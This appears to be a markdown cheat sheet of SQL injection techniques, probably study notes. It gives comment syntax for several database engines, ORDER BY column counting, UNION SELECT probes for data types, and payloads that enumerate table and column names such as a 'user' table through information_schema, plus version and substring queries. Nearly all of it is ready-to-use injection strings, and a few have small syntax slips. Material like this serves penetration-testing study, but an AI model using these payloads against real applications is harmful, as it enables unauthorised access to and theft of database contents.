---------------------

# Comments

Oracle   
	`--comment`

Microsoft   
	```--comment 
	/*comment*/```

PostgreSQL
	```--comment 
	/*comment*/```
	
MySQL
	```#comment  
	-- comment
	*comment*/``


----------------------

# Get query column size

To get the amount of columns of the query we can do an order by number of columns until it throws an error, that would mean that we exceeded the amount of columns.

`' order by 1-- -`
`' order by 2-- -`
`' order by 3-- -`

---------------------------

# Finding columns with a useful data type

We can see the data type by trial and error

' UNION SELECT ‘a’,NULL,NULL,NULL --
' UNION SELECT NULL,’a’,NULL,NULL -- 
' UNION SELECT NULL,NULL,’a’,NULL --
' UNION SELECT NULL,NULL,NULL,’a’ --

-----------------------

# Get Tables Names

Gifts' UNION SELECT 1, NULL, table_name, NULL, from information_schema.tables--

1' and 1=2 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema = database() -- -

------------------------

# Get column names

1' and 1=2 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema = database() and table_name ='user'-- -

Gifts' and 1=2 UNION SELECT 1, 'a', column_name, 2, 3, 'c', 4, 'd' from information_schema.columns WHERE table_name = 'products' -- 

-------------------------------

# Substring

Oracle 
	`SUBSTR('foobar', 4, 2)`
	
Microsoft 
	`SUBSTRING('foobar', 4, 2)`
	
PostgreSQL 
	`SUBSTRING('foobar', 4, 2)`
	
MySQL 
	`SUBSTRING('foobar', 4, 2)`


------------------------------------

# Version

Oracle
	`SELECT banner FROM v$version   SELECT version FROM v$instance`
	
Microsoft
	`SELECT @@version`
	
PostgreSQL
	`SELECT version()`
	
MySQL
	`SELECT @@version`
